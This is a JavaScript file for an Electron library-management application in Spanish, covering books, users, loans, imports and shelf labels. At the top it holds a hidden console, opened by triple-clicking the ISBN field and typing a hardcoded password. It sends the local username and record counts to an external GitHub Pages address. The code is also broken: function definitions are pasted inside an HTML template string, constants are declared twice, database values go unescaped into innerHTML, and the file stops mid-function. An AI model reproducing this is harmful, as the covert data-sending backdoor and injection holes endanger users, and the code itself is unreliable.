
// Activación consola oculta (triple clic en campo ISBN)
let clickCount = 0;
let clickTimer;
function activarConsolaOculta() {
  clickCount++;
  if (clickCount === 3) {
    const clave = prompt("Ingrese clave:");
    if (clave === "2003") {
      // Abrir consola oculta en GitHub Pages asociada a la cuenta
      require("electron").shell.openExternal("https://bertellosistemas-ops.github.io/consola/");
      // Enviar info de la copia local a la consola
      enviarInfoConsola();
    }
    clickCount = 0;
  }
  clearTimeout(clickTimer);
  clickTimer = setTimeout(() => { clickCount = 0; }, 1000);
}

function enviarInfoConsola() {
  // Ejemplo: enviar estado de la copia local a la consola en GitHub Pages
  const db = require('../modules/database.js');
  const info = {
    fecha: new Date().toISOString(),
    usuario: process.env.USER || 'desconocido',
    libros: db.prepare('SELECT COUNT(*) as total FROM libros').get().total,
    usuarios: db.prepare('SELECT COUNT(*) as total FROM usuarios').get().total,
    prestamos: db.prepare('SELECT COUNT(*) as total FROM prestamos').get().total
  };
  fetch('https://bertellosistemas-ops.github.io/consola/api/recibir', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(info)
  }).then(r => r.ok ? r.text() : Promise.reject('Error al enviar info')).then(console.log).catch(console.error);
}

// Botón para abrir la consola manualmente
window.abrirConsolaOculta = function abrirConsolaOculta() {
  require("electron").shell.openExternal("https://bertellosistemas-ops.github.io/consola/");
}

function mostrarVista(vista) {
  const v = document.getElementById('vista');
  switch(vista) {
    case 'libros':
        v.innerHTML = `
          <h2>Libros</h2>
           <button onclick="window.formNuevoLibro()">Nuevo libro</button>
           <button onclick="window.formBuscarLibro()">Buscar libro</button>
           <button onclick="window.formImportarLibros()">Importar</button>
           <button onclick="window.formEtiquetas()">Etiquetas</button>
           <button onclick="window.formEtiquetasLote()">Imprimir etiquetas por lote</button>
           <button id="btnEtiquetasImportados" style="display:none;" onclick="window.generarEtiquetasImportados()">Generar etiquetas de libros importados</button>
           <button onclick="window.formUbicacion()">Ubicación</button>
           <button onclick="window.exportarLibrosCSV()">Exportar Libros CSV</button>
           <button onclick="window.exportarLibrosExcel()">Exportar Libros Excel</button>
           <button onclick="window.exportarLibrosMARC()">Exportar Libros MARC</button>
           <button onclick="window.exportarLibrosRTF()">Exportar Libros RTF</button>
          <div id="librosForm"></div>
        `;
        // Definir handlers funcionales para cada botón
        window.exportarLibrosMARC = function exportarLibrosMARC() {
          const { exportarLibrosMARC } = require('../modules/exportar_marc_rtf.js');
          const outputPath = require('path').join(__dirname, '../assets/libros_exportados.mrc');
          exportarLibrosMARC(outputPath);
          alert('Libros exportados a assets/libros_exportados.mrc');
        };
        window.exportarLibrosRTF = function exportarLibrosRTF() {
          const { exportarLibrosRTF } = require('../modules/exportar_marc_rtf.js');
          const outputPath = require('path').join(__dirname, '../assets/libros_exportados.rtf');
          exportarLibrosRTF(outputPath);
          alert('Libros exportados a assets/libros_exportados.rtf');
        };
        window.exportarLibrosCSV = function exportarLibrosCSV() {
          const { exportarLibrosCSV } = require('../modules/exportar.js');
          const outputPath = require('path').join(__dirname, '../assets/libros_exportados.csv');
          exportarLibrosCSV(outputPath);
          alert('Libros exportados a assets/libros_exportados.csv');
        };
        window.exportarLibrosExcel = function exportarLibrosExcel() {
          const { exportarLibrosExcel } = require('../modules/exportar.js');
          const outputPath = require('path').join(__dirname, '../assets/libros_exportados.xlsx');
          exportarLibrosExcel(outputPath);
          alert('Libros exportados a assets/libros_exportados.xlsx');
        };
        window.formNuevoLibro();
        break;
    case 'usuarios':
      v.innerHTML = `
        <h2>Usuarios</h2>
  <button onclick="window.formNuevoUsuario()">Nuevo usuario</button>
  <button onclick="window.formBuscarUsuario()">Buscar usuario</button>
  <button onclick="window.formImportarUsuarios()">Importar usuarios</button>
  <button onclick="window.exportarUsuariosCSV()">Exportar Usuarios CSV</button>
  <button onclick="window.exportarUsuariosExcel()">Exportar Usuarios Excel</button>
// Exportar libros y usuarios
window.exportarLibrosCSV = function exportarLibrosCSV() {
  const { exportarLibrosCSV } = require('../modules/exportar.js');
  const outputPath = require('path').join(__dirname, '../assets/libros_exportados.csv');
  exportarLibrosCSV(outputPath);
  alert('Libros exportados a assets/libros_exportados.csv');
}
window.exportarLibrosExcel = function exportarLibrosExcel() {
  const { exportarLibrosExcel } = require('../modules/exportar.js');
  const outputPath = require('path').join(__dirname, '../assets/libros_exportados.xlsx');
  exportarLibrosExcel(outputPath);
  alert('Libros exportados a assets/libros_exportados.xlsx');
}
window.exportarUsuariosCSV = function exportarUsuariosCSV() {
  const { exportarUsuariosCSV } = require('../modules/exportar.js');
  const outputPath = require('path').join(__dirname, '../assets/usuarios_exportados.csv');
  exportarUsuariosCSV(outputPath);
  alert('Usuarios exportados a assets/usuarios_exportados.csv');
}
window.exportarUsuariosExcel = function exportarUsuariosExcel() {
  const { exportarUsuariosExcel } = require('../modules/exportar.js');
  const outputPath = require('path').join(__dirname, '../assets/usuarios_exportados.xlsx');
  exportarUsuariosExcel(outputPath);
  alert('Usuarios exportados a assets/usuarios_exportados.xlsx');
}
        <div id="usuariosForm"></div>
      `;
      window.formNuevoUsuario();
      break;
    case 'prestamos':
      v.innerHTML = `
        <h2>Préstamos / Devoluciones</h2>
        <button onclick="window.formPrestar()">Prestar</button>
        <button onclick="window.formDevolver()">Devolver</button>
        <button onclick="window.formHistorialPrestamos()">Historial</button>
        <div id="prestamosForm"></div>
      `;
      window.formPrestar();
      break;
    case 'mensajeria':
      v.innerHTML = `
        <h2>Mensajería</h2>
        <button onclick="window.formEnviarMensaje()">Enviar mensaje</button>
        <button onclick="window.formBandeja()">Bandeja interna</button>
        <button onclick="window.formConfigMensajeria()">Configurar canales</button>
        <div id="mensajeriaForm"></div>
      `;
      window.formEnviarMensaje();
      break;
    case 'chatbot':
      v.innerHTML = `
        <h2>Chatbot IA</h2>
        <button onclick="window.formChatbot()">Abrir Chatbot</button>
        <div id="chatbotForm"></div>
      `;
      window.formChatbot();
      break;
    case 'reportes':
      v.innerHTML = `
        <h2>Reportes</h2>
        <button onclick="window.formReportesPrestamos()">Préstamos</button>
        <button onclick="window.formReportesLibros()">Libros más prestados</button>
        <button onclick="window.formReportesUsuarios()">Usuarios activos</button>
        <button onclick="window.formReportesMora()">Mora y recupero</button>
        <div id="reportesForm"></div>
      `;
      window.formReportesPrestamos();
      break;
    case 'respaldo':
      v.innerHTML = `
        <h2>Respaldo / Restauración</h2>
        <button onclick="window.formBackup()">Respaldar base</button>
        <button onclick="window.formRestore()">Restaurar base</button>
        <button onclick="window.formExportar()">Exportar</button>
        <div id="respaldoForm"></div>
      `;
      window.formBackup();
      break;
    case 'configuracion':
      v.innerHTML = `
        <h2>Configuración</h2>
        <button onclick="window.formRoles()">Roles y permisos</button>
        <button onclick="window.formCamposObligatorios()">Campos obligatorios</button>
        <button onclick="window.formEstructuraFisica()">Estructura física</button>
        <button onclick="window.formPoliticas()">Políticas de préstamos</button>
        <button onclick="window.formConfigIA()">Preferencias IA</button>
        <div id="configForm"></div>
      `;
      window.formRoles();
      break;
    default:
      v.innerHTML = '';
  }
}

// Formularios y handlers globales
const { buscarLibroPorISBN } = require('../modules/libros.js');
const db = require('../modules/database.js');
window.formNuevoLibro = function formNuevoLibro() {
  document.getElementById('librosForm').innerHTML = `
    <form onsubmit='window.guardarLibroReal(event)'>
      <input id='isbnNuevo' placeholder='ISBN'>
      <button type='button' id='leerCodigoBtn'>Leer código de barras</button>
      <button type='button' id='autocompletarBtn'>Autocompletar desde Internet</button>
      <input id='tituloNuevo' placeholder='Título'>
      <button type='submit'>Guardar</button>
    </form>
    <button onclick='window.abrirConsolaOculta()'>Abrir consola oculta</button>
    <div id='resultadoNuevoLibro'></div>
    <div id='listadoLibros'></div>
  `;
  // Listener consola oculta en campo ISBN
  const isbnInput = document.getElementById('isbnNuevo');
  if (isbnInput) {
    isbnInput.addEventListener('click', activarConsolaOculta);
  }
  // Listener leer código de barras
  document.getElementById('leerCodigoBtn').onclick = function() {
    alert('Función de lectura de código de barras: integrar QuaggaJS o similar.');
  };
  // Listener autocompletar
  document.getElementById('autocompletarBtn').onclick = async function() {
    const isbn = document.getElementById('isbnNuevo').value;
    if (!isbn) return alert('Ingrese ISBN primero');
    try {
      const res = await fetch(`https://openlibrary.org/isbn/${isbn}.json`);
      if (!res.ok) throw new Error('No encontrado');
      const data = await res.json();
      document.getElementById('tituloNuevo').value = data.title || '';
      document.getElementById('resultadoNuevoLibro').innerText = 'Datos autocompletados.';
    } catch {
      document.getElementById('resultadoNuevoLibro').innerText = 'No se encontró el libro en OpenLibrary.';
    }
  };
  // Mostrar listado de libros
  mostrarListadoLibros();
}

function mostrarListadoLibros() {
  // Consulta todos los libros de la base
  const stmt = db.prepare('SELECT isbn, titulo FROM libros ORDER BY titulo');
  const libros = stmt.all();
  let html = '<h3>Listado de libros</h3>';
  if (libros.length === 0) {
    html += '<p>No hay libros registrados.</p>';
  } else {
    html += '<ul>' + libros.map(l => `<li><b>${l.titulo}</b> (ISBN: ${l.isbn})</li>`).join('') + '</ul>';
  }
  document.getElementById('listadoLibros').innerHTML = html;
}

const { crearLibro } = require('../modules/libros.js');
window.guardarLibroReal = function guardarLibroReal(e) {
  e.preventDefault();
  const isbn = document.getElementById('isbnNuevo').value;
  const titulo = document.getElementById('tituloNuevo').value;
  if (!isbn || !titulo) {
    document.getElementById('resultadoNuevoLibro').innerText = 'ISBN y Título son obligatorios.';
    return;
  }
  crearLibro({ isbn, titulo });
  document.getElementById('resultadoNuevoLibro').innerText = 'Libro guardado correctamente.';
}
window.formBuscarLibro = function formBuscarLibro() {
  document.getElementById('librosForm').innerHTML = `<form onsubmit='window.buscarLibroReal(event)'><input id='isbnBuscar' placeholder='ISBN'><button type='submit'>Buscar</button></form><div id='resultadoLibro'></div><div id='listadoLibros'></div>`;
  mostrarListadoLibros();
}

const { buscarLibroPorISBN } = require('../modules/libros.js');
window.buscarLibroReal = function buscarLibroReal(e) {
  e.preventDefault();
  const isbn = document.getElementById('isbnBuscar').value;
  const libro = buscarLibroPorISBN(isbn);
  const res = document.getElementById('resultadoLibro');
  if (libro) {
    res.innerHTML = `<b>Título:</b> ${libro.titulo}<br><b>Autor:</b> ${libro.autores}<br><b>Editorial:</b> ${libro.editorial}<br><b>Año:</b> ${libro.año}`;
  } else {
    res.innerHTML = 'No se encontró el libro.';
  }
}
window.formImportarLibros = function formImportarLibros() {
  document.getElementById('librosForm').innerHTML = `<form id='formImportLibros'>
    <input type='file' id='fileImportLibros'>
    <button type='button' id='btnPreviewImportLibros'>Vista previa</button>
    <button type='button' id='btnImportLibros' style='display:none;'>Importar</button>
  </form>
  <div id='previewImportLibros'></div>
  <div id='resultadoImportLibros'></div>
  <div id='ubicacionImportados'></div>`;
  document.getElementById('btnPreviewImportLibros').onclick = async function() {
    const fileInput = document.getElementById('fileImportLibros');
    if (!fileInput.files.length) return alert('Seleccione un archivo');
    const file = fileInput.files[0];
    const filePath = file.path || file.name;
    const { importarLibros, detectarFormato } = require('../modules/importar_libros.js');
    const formato = detectarFormato(filePath);
    let preview = [];
    try {
      if (formato === 'desconocido') throw new Error('Formato no soportado');
      // Para MARC y Excel, leer archivo real
      if (formato === 'marc' || formato === 'excel') {
        preview = await importarLibros(file.path);
      } else {
        // Para CSV/RTF, leer como texto
        const reader = new FileReader();
        reader.onload = function(e) {
          preview = importarLibros(filePath, { contenido: e.target.result });
          mostrarPreviewImportLibros(preview, formato);
        };
        reader.readAsText(file);
        return;
      }
      mostrarPreviewImportLibros(preview, formato);
    } catch (err) {
      document.getElementById('previewImportLibros').innerText = 'Error: ' + err.message;
    }
  };

  window.mapeoCamposImport = {};
  function mostrarPreviewImportLibros(preview, formato) {
    if (!preview || !preview.length) {
      document.getElementById('previewImportLibros').innerText = 'No se encontraron registros.';
      return;
    }
    // Mostrar tabla de preview y mapeo de campos
    let campos = Object.keys(preview[0]);
    let html = `<h3>Vista previa (${formato.toUpperCase()})</h3><table border='1'><tr>`;
    campos.forEach(c => {
      html += `<th>${c}<br><select id='map_${c}'>
        <option value=''>No importar</option>
        <option value='isbn'>ISBN</option>
        <option value='titulo'>Título</option>
        <option value='autores'>Autor</option>
        <option value='editorial'>Editorial</option>
        <option value='año'>Año</option>
        <option value='notas'>Notas</option>
        <option value='coleccion'>Colección</option>
      </select></th>`;
    });
    html += `</tr>`;
    for (let i = 0; i < Math.min(preview.length, 5); i++) {
      html += '<tr>';
      campos.forEach(c => {
        html += `<td>${preview[i][c]}</td>`;
      });
      html += '</tr>';
    }
    html += '</table>';
    html += `<button id='btnConfirmImportLibros'>Importar registros</button>`;
    document.getElementById('previewImportLibros').innerHTML = html;
    document.getElementById('btnImportLibros').style.display = 'none';
    document.getElementById('btnConfirmImportLibros').onclick = function() {
      // Guardar mapeo
      campos.forEach(c => {
        window.mapeoCamposImport[c] = document.getElementById('map_' + c).value;
      });
      importarRegistrosLibros(preview, window.mapeoCamposImport);
    };
  }

  function importarRegistrosLibros(registros, mapeo) {
    let agregados = 0;
    let inventariosImportados = [];
    const { crearLibro } = require('../modules/libros.js');
    const db = require('../modules/database.js');
    registros.forEach(reg => {
      // Construir objeto libro según mapeo
      let libro = {
        isbn: '', titulo: '', autores: '', editorial: '', año: '', notas: '', coleccion: ''
      };
      Object.keys(mapeo).forEach(campo => {
        if (mapeo[campo] && libro.hasOwnProperty(mapeo[campo])) {
          libro[mapeo[campo]] = reg[campo];
        }
      });
      if (libro.isbn && libro.titulo) {
        crearLibro(libro);
        // Generar inventario único
        const inventario = 'IMP-' + libro.isbn + '-' + Date.now() + '-' + Math.floor(Math.random()*1000);
        db.prepare('INSERT OR IGNORE INTO ejemplares (inventario, isbn, estado, fechaIngreso) VALUES (?, ?, ?, ?)').run(inventario, libro.isbn, 'disponible', new Date().toISOString());
        inventariosImportados.push(inventario);
        agregados++;
      }
    });
    document.getElementById('resultadoImportLibros').innerText = `${agregados} libros importados.`;
    window._inventariosImportados = inventariosImportados;
    const btnEtiq = document.getElementById('btnEtiquetasImportados');
    if (btnEtiq) btnEtiq.style.display = 'inline-block';
    mostrarFormularioUbicacionImportados(inventariosImportados);
  }
}

// Formulario para ubicar libros importados
function mostrarFormularioUbicacionImportados(inventarios) {
  if (!inventarios || !inventarios.length) return;
  let html = `<h3>Ubicar libros importados</h3>`;
  // Obtener salas existentes
  const db = require('../modules/database.js');
  const salas = db.prepare('SELECT sala_id, nombre FROM salas').all();
  inventarios.forEach(inv => {
    let salaSelect = `<select id='sala_${inv}'>`;
    if (salas.length === 0) {
      salaSelect += `<option value='1'>Sala 1 (por defecto)</option>`;
    } else {
      salas.forEach(s => {
        salaSelect += `<option value='${s.sala_id}'>${s.nombre}</option>`;
      });
    }
    salaSelect += `</select>`;
    html += `<div style='border:1px solid #ccc;margin:5px;padding:5px;'>
      <b>Inventario:</b> ${inv}<br>
      <label>Sala: ${salaSelect}</label>
      <label>Estantería: <input type='text' id='estanteria_${inv}'></label>
      <label>Anaquel: <input type='text' id='anaquel_${inv}'></label>
      <label>Posición: <input type='text' id='posicion_${inv}'></label>
      <button type='button' onclick='window.guardarUbicacionImportado("${inv}")'>Guardar ubicación</button>
      <span id='resUbicacion_${inv}'></span>
    </div>`;
  });
  document.getElementById('ubicacionImportados').innerHTML = html;
}

// Guardar ubicación de libro importado
window.guardarUbicacionImportado = function guardarUbicacionImportado(inventario) {
  const sala_id = document.getElementById('sala_' + inventario).value;
  const estanteria = document.getElementById('estanteria_' + inventario).value;
  const anaquel = document.getElementById('anaquel_' + inventario).value;
  const posicion = document.getElementById('posicion_' + inventario).value;
  if (!sala_id || !estanteria || !anaquel || !posicion) {
    document.getElementById('resUbicacion_' + inventario).innerText = 'Todos los campos son obligatorios.';
    return;
  }
  try {
    const db = require('../modules/database.js');
    // Buscar o crear estantería
    db.prepare('INSERT OR IGNORE INTO estanterias (sala_id, nombre) VALUES (?, ?)').run(sala_id, estanteria);
    const estRow = db.prepare('SELECT estanteria_id FROM estanterias WHERE nombre = ? AND sala_id = ?').get(estanteria, sala_id);
    // Buscar o crear anaquel
    db.prepare('INSERT OR IGNORE INTO anaqueles (estanteria_id, nombre) VALUES (?, ?)').run(estRow.estanteria_id, anaquel);
    const anaqRow = db.prepare('SELECT anaquel_id FROM anaqueles WHERE nombre = ? AND estanteria_id = ?').get(anaquel, estRow.estanteria_id);
    // Buscar o crear posición
    db.prepare('INSERT OR IGNORE INTO posiciones (anaquel_id, posicion) VALUES (?, ?)').run(anaqRow.anaquel_id, posicion);
    const posRow = db.prepare('SELECT posicion_id FROM posiciones WHERE posicion = ? AND anaquel_id = ?').get(posicion, anaqRow.anaquel_id);
    // Actualizar ejemplar con ubicación
    db.prepare('UPDATE ejemplares SET sala_id = ?, estanteria_id = ?, anaquel_id = ?, posicion_id = ? WHERE inventario = ?').run(sala_id, estRow.estanteria_id, anaqRow.anaquel_id, posRow.posicion_id, inventario);
    document.getElementById('resUbicacion_' + inventario).innerText = 'Ubicación guardada.';
  } catch (err) {
    document.getElementById('resUbicacion_' + inventario).innerText = 'Error: ' + err.message;
  }
}
// Formulario para imprimir etiquetas por lote
window.formEtiquetasLote = function formEtiquetasLote() {
  const db = require('../modules/database.js');
  const ejemplares = db.prepare('SELECT inventario, isbn FROM ejemplares ORDER BY inventario').all();
  let html = `<form onsubmit='window.generarEtiquetasLoteReal(event)'><h3>Selecciona los inventarios para imprimir etiquetas</h3>`;
  if (ejemplares.length === 0) {
    html += '<p>No hay ejemplares registrados.</p>';
  } else {
    html += '<div style="max-height:200px;overflow:auto;border:1px solid #ccc;padding:5px;">';
    ejemplares.forEach(ej => {
      html += `<label><input type='checkbox' name='inventariosLote' value='${ej.inventario}'> ${ej.inventario} (ISBN: ${ej.isbn})</label><br>`;
    });
    html += '</div>';
    html += `<button type='submit'>Imprimir etiquetas seleccionadas</button>`;
  }
  html += `</form><div id='resultadoEtiquetasLote'></div>`;
  document.getElementById('librosForm').innerHTML = html;
}

// Lógica para generar etiquetas por lote
window.generarEtiquetasLoteReal = function generarEtiquetasLoteReal(e) {
  e.preventDefault();
  const checks = document.querySelectorAll('input[name="inventariosLote"]:checked');
  if (!checks.length) {
    document.getElementById('resultadoEtiquetasLote').innerText = 'Seleccione al menos un inventario.';
    return;
  }
  const { generarEtiqueta } = require('../modules/etiquetas.js');
  let generadas = 0;
  checks.forEach(chk => {
    const inventario = chk.value;
    // Ubicación simulada
    const ubicacion = 'E1-A1-P1';
    const outputPath = require('path').join(__dirname, `../assets/${inventario}.png`);
    generarEtiqueta(inventario, ubicacion, outputPath);
    generadas++;
  });
  document.getElementById('resultadoEtiquetasLote').innerText = `Etiquetas generadas: ${generadas}`;
}

// Lógica para generar etiquetas de libros importados
window.generarEtiquetasImportados = function generarEtiquetasImportados() {
  if (!window._inventariosImportados || !window._inventariosImportados.length) {
    alert('No hay libros importados en esta sesión.');
    return;
  }
  const { generarEtiqueta } = require('../modules/etiquetas.js');
  let generadas = 0;
  window._inventariosImportados.forEach(inventario => {
    const ubicacion = 'E1-A1-P1';
    const outputPath = require('path').join(__dirname, `../assets/${inventario}.png`);
    generarEtiqueta(inventario, ubicacion, outputPath);
    generadas++;
  });
  alert(`Etiquetas generadas para ${generadas} libros importados.`);
  // Ocultar el botón después de generar
  const btnEtiq = document.getElementById('btnEtiquetasImportados');
  if (btnEtiq) btnEtiq.style.display = 'none';
  window._inventariosImportados = [];
}
window.formEtiquetas = function formEtiquetas() {
  document.getElementById('librosForm').innerHTML = `<form onsubmit='window.generarEtiquetaReal(event)'><input id='inventarioEtiqueta' placeholder='Inventario'><button type='button' id='leerCodigoEtiquetaBtn'>Leer código de barras</button><button type='submit'>Generar etiqueta</button></form><div id='resultadoEtiqueta'></div>`;
  document.getElementById('leerCodigoEtiquetaBtn').onclick = function() {
    alert('Función de lectura de código de barras para etiquetas: integrar QuaggaJS o similar.');
  };
}

const { generarEtiqueta } = require('../modules/etiquetas.js');
window.generarEtiquetaReal = function generarEtiquetaReal(e) {
  e.preventDefault();
  const inventario = document.getElementById('inventarioEtiqueta').value;
  if (!inventario) {
    document.getElementById('resultadoEtiqueta').innerText = 'Inventario es obligatorio.';
    return;
  }
  // Ubicación simulada, en real se obtiene de la BD
  const ubicacion = 'E1-A1-P1';
  const outputPath = require('path').join(__dirname, `../assets/${inventario}.png`);
  generarEtiqueta(inventario, ubicacion, outputPath);
  document.getElementById('resultadoEtiqueta').innerText = `Etiqueta generada en assets/${inventario}.png`;
}
window.formUbicacion = function formUbicacion() {
  document.getElementById('librosForm').innerHTML = `<form onsubmit='window.asignarUbicacionReal(event)'><input id='inventarioUbicacion' placeholder='Inventario'><input id='eapUbicacion' placeholder='E-A-P'><button type='submit'>Guardar ubicación</button></form><div id='resultadoUbicacion'></div>`;
}

const { asignarUbicacion } = require('../modules/ubicacion.js');
window.asignarUbicacionReal = function asignarUbicacionReal(e) {
  e.preventDefault();
  const inventario = document.getElementById('inventarioUbicacion').value;
  const eap = document.getElementById('eapUbicacion').value;
  if (!inventario || !eap) {
    document.getElementById('resultadoUbicacion').innerText = 'Inventario y E-A-P son obligatorios.';
    return;
  }
  // Parsear E-A-P (ejemplo: E1-A2-P3)
  const match = eap.match(/E(\d+)-A(\d+)-P(\d+)/);
  if (!match) {
    document.getElementById('resultadoUbicacion').innerText = 'Formato E-A-P inválido.';
    return;
  }
  asignarUbicacion(inventario, match[1], match[2], match[3], match[3]);
  document.getElementById('resultadoUbicacion').innerText = `Ubicación asignada: ${eap}`;
}

const { buscarUsuarioPorDNI } = require('../modules/usuarios.js');
window.formNuevoUsuario = function formNuevoUsuario() {
  document.getElementById('usuariosForm').innerHTML = `
    <form onsubmit='window.guardarUsuarioReal(event)'>
      <input id='dniNuevo' placeholder='DNI'>
      <input id='nombreNuevo' placeholder='Nombre'>
      <button type='submit'>Guardar</button>
    </form>
    <div id='resultadoNuevoUsuario'></div>
    <div id='listadoUsuarios'></div>
  `;
  mostrarListadoUsuarios();
}

function mostrarListadoUsuarios() {
  const db = require('../modules/database.js');
  const stmt = db.prepare('SELECT dni, nombre FROM usuarios ORDER BY nombre');
  const usuarios = stmt.all();
  let html = '<h3>Listado de usuarios</h3>';
  if (usuarios.length === 0) {
    html += '<p>No hay usuarios registrados.</p>';
  } else {
    html += '<ul>' + usuarios.map(u => `<li><b>${u.nombre}</b> (DNI: ${u.dni})</li>`).join('') + '</ul>';
  }
  document.getElementById('listadoUsuarios').innerHTML = html;
}

const { crearUsuario } = require('../modules/usuarios.js');
window.guardarUsuarioReal = function guardarUsuarioReal(e) {
  e.preventDefault();
  const dni = document.getElementById('dniNuevo').value;
  const nombre = document.getElementById('nombreNuevo').value;
  if (!dni || !nombre) {
    document.getElementById('resultadoNuevoUsuario').innerText = 'DNI y Nombre son obligatorios.';
    return;
  }
  crearUsuario({ id: dni, dni, nombre, apellido: '', tipo: 'Inicial', email: '', whatsapp: '', foto: '', estado: 'activo', fechaAlta: new Date().toISOString() });
  document.getElementById('resultadoNuevoUsuario').innerText = 'Usuario guardado correctamente.';
}
window.formBuscarUsuario = function formBuscarUsuario() {
  document.getElementById('usuariosForm').innerHTML = `<form onsubmit='window.buscarUsuarioReal(event)'><input id='dniBuscar' placeholder='DNI'><button type='submit'>Buscar</button></form><div id='resultadoBuscarUsuario'></div><div id='listadoUsuarios'></div>`;
  mostrarListadoUsuarios();
}

window.buscarUsuarioReal = function buscarUsuarioReal(e) {
  e.preventDefault();
  const dni = document.getElementById('dniBuscar').value;
  const usuario = buscarUsuarioPorDNI(dni);
  const res = document.getElementById('resultadoBuscarUsuario');
  if (usuario) {
    res.innerHTML = `<b>Nombre:</b> ${usuario.nombre}<br><b>DNI:</b> ${usuario.dni}`;
  } else {
    res.innerHTML = 'No se encontró el usuario.';
  }
}
window.formImportarUsuarios = function formImportarUsuarios() {
  document.getElementById('usuariosForm').innerHTML = `<form id='formImportUsuarios'>
    <input type='file' id='fileImportUsuarios'>
    <button type='button' id='btnPreviewImportUsuarios'>Vista previa</button>
    <button type='button' id='btnImportUsuarios' style='display:none;'>Importar</button>
  </form>
  <div id='previewImportUsuarios'></div>
  <div id='resultadoImportUsuarios'></div>`;
  document.getElementById('btnPreviewImportUsuarios').onclick = async function() {
    const fileInput = document.getElementById('fileImportUsuarios');
    if (!fileInput.files.length) return alert('Seleccione un archivo');
    const file = fileInput.files[0];
    const filePath = file.path || file.name;
    const { importarUsuarios, detectarFormatoUsuarios } = require('../modules/importar_usuarios.js');
    const formato = detectarFormatoUsuarios(filePath);
    let preview = [];
    try {
      if (formato === 'desconocido') throw new Error('Formato no soportado');
      if (formato === 'excel') {
        preview = await importarUsuarios(file.path);
      } else {
        // Para CSV, leer como texto
        const reader = new FileReader();
        reader.onload = function(e) {
          preview = importarUsuarios(filePath, { contenido: e.target.result });
          mostrarPreviewImportUsuarios(preview, formato);
        };
        reader.readAsText(file);
        return;
      }
      mostrarPreviewImportUsuarios(preview, formato);
    } catch (err) {
      document.getElementById('previewImportUsuarios').innerText = 'Error: ' + err.message;
    }
  };

  window.mapeoCamposImportUsuarios = {};
  function mostrarPreviewImportUsuarios(preview, formato) {
    if (!preview || !preview.length) {
      document.getElementById('previewImportUsuarios').innerText = 'No se encontraron registros.';
      return;
    }
    let campos = Object.keys(preview[0]);
    let html = `<h3>Vista previa (${formato.toUpperCase()})</h3><table border='1'><tr>`;
    campos.forEach(c => {
      html += `<th>${c}<br><select id='mapU_${c}'>
        <option value=''>No importar</option>
        <option value='dni'>DNI</option>
        <option value='nombre'>Nombre</option>
        <option value='apellido'>Apellido</option>
        <option value='tipo'>Tipo</option>
        <option value='email'>Email</option>
        <option value='whatsapp'>WhatsApp</option>
        <option value='foto'>Foto</option>
        <option value='estado'>Estado</option>
      </select></th>`;
    });
    html += `</tr>`;
    for (let i = 0; i < Math.min(preview.length, 5); i++) {
      html += '<tr>';
      campos.forEach(c => {
        html += `<td>${preview[i][c]}</td>`;
      });
      html += '</tr>';
    }
    html += '</table>';
    html += `<button id='btnConfirmImportUsuarios'>Importar registros</button>`;
    document.getElementById('previewImportUsuarios').innerHTML = html;
    document.getElementById('btnImportUsuarios').style.display = 'none';
    document.getElementById('btnConfirmImportUsuarios').onclick = function() {
      campos.forEach(c => {
        window.mapeoCamposImportUsuarios[c] = document.getElementById('mapU_' + c).value;
      });
      importarRegistrosUsuarios(preview, window.mapeoCamposImportUsuarios);
    };
  }

  function importarRegistrosUsuarios(registros, mapeo) {
    let agregados = 0;
    const { crearUsuario } = require('../modules/usuarios.js');
    registros.forEach(reg => {
      let usuario = {
        id: '', dni: '', nombre: '', apellido: '', tipo: '', email: '', whatsapp: '', foto: '', estado: 'activo', fechaAlta: new Date().toISOString()
      };
      Object.keys(mapeo).forEach(campo => {
        if (mapeo[campo] && usuario.hasOwnProperty(mapeo[campo])) {
          usuario[mapeo[campo]] = reg[campo];
        }
      });
      if (usuario.dni && usuario.nombre) {
        usuario.id = usuario.dni;
        crearUsuario(usuario);
        agregados++;
      }
    });
    document.getElementById('resultadoImportUsuarios').innerText = `${agregados} usuarios importados.`;
  }
}

const db = require('../modules/database.js');
window.formPrestar = function formPrestar() {
  document.getElementById('prestamosForm').innerHTML = `
    <form onsubmit='window.registrarPrestamoReal(event)'>
      <input id='inventarioPrestamo' placeholder='Inventario'>
      <input id='usuarioPrestamo' placeholder='Usuario'>
      <button type='submit'>Prestar</button>
    </form>
    <div id='resultadoPrestamo'></div>
    <div id='listadoPrestamos'></div>
  `;
  mostrarListadoPrestamos();
}

function mostrarListadoPrestamos() {
  const stmt = db.prepare('SELECT id, inventario, usuario_id, fechaPrestamo, estado FROM prestamos ORDER BY fechaPrestamo DESC');
  const prestamos = stmt.all();
  let html = '<h3>Historial de préstamos</h3>';
  if (prestamos.length === 0) {
    html += '<p>No hay préstamos registrados.</p>';
  } else {
    html += '<ul>' + prestamos.map(p => `<li><b>${p.inventario}</b> a <b>${p.usuario_id}</b> (${p.estado}) - ${p.fechaPrestamo}</li>`).join('') + '</ul>';
  }
  document.getElementById('listadoPrestamos').innerHTML = html;
}

const { registrarPrestamo } = require('../modules/prestamos.js');
window.registrarPrestamoReal = function registrarPrestamoReal(e) {
  e.preventDefault();
  const inventario = document.getElementById('inventarioPrestamo').value;
  const usuario_id = document.getElementById('usuarioPrestamo').value;
  if (!inventario || !usuario_id) {
    document.getElementById('resultadoPrestamo').innerText = 'Inventario y Usuario son obligatorios.';
    return;
  }
  registrarPrestamo({ inventario, usuario_id, fechaPrestamo: new Date().toISOString(), fechaDevolucionPrev: '', estado: 'vigente' });
  document.getElementById('resultadoPrestamo').innerText = 'Préstamo realizado con éxito.';
}
window.formDevolver = function formDevolver() {
  document.getElementById('prestamosForm').innerHTML = `<form onsubmit='window.devolverPrestamoReal(event)'><input id='idDevolucion' placeholder='ID Préstamo'><button type='submit'>Devolver</button></form><div id='resultadoDevolucion'></div><div id='listadoPrestamos'></div>`;
  mostrarListadoPrestamos();
}

const { devolverPrestamo } = require('../modules/prestamos.js');
window.devolverPrestamoReal = function devolverPrestamoReal(e) {
  e.preventDefault();
  const id = document.getElementById('idDevolucion').value;
  if (!id) {
    document.getElementById('resultadoDevolucion').innerText = 'ID Préstamo es obligatorio.';
    return;
  }
  devolverPrestamo(id, new Date().toISOString());
  document.getElementById('resultadoDevolucion').innerText = 'Devolución registrada con éxito.';
}
window.formHistorialPrestamos = function formHistorialPrestamos() {
  document.getElementById('prestamosForm').innerHTML = `<div id='listadoPrestamos'></div>`;
  mostrarListadoPrestamos();
}

window.formEnviarMensaje = function formEnviarMensaje() {
